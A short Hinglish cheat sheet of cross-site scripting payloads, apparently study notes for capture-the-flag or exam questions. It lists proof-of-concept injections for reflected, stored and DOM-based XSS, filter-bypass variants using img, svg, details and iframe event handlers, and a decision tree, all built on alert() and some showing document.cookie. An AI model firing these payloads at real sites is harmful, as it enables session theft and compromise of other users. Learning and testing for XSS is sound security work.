# ⚡ XSS DHUNDO / EXPLOIT KARO

---

## CASE 1: Reflected XSS (URL mein inject)
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```
> URL ke parameter mein daalo: `?name=<script>alert(1)</script>`

---

## CASE 2: Stored XSS (Guestbook / Comment)
```html
<script>alert(document.cookie)</script>
<img src=x onerror="alert('Stored XSS')">
<body onload=alert('XSS')>
```
> Submit karo form mein → Page reload pe execute hoga

---

## CASE 3: DOM-Based XSS
```
http://target.com/page#<script>alert(1)</script>
```

---

## CASE 4: Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>                  <!-- case change -->
<img src=x onerror=alert(1)>               <!-- no script tag -->
<svg/onload=alert(1)>                      <!-- svg tag -->
<details open ontoggle=alert(1)>           <!-- HTML5 events -->
<iframe src="javascript:alert(1)">         <!-- iframe -->
```

---

## QUICK DECISION:
```
XSS question
  ├─ Input field / URL param? → <script>alert(1)</script>
  ├─ Stored? → comment/guestbook mein inject
  ├─ Filtered? → img/svg/iframe alternatives try karo
  └─ Cookie steal? → <script>alert(document.cookie)</script>
```
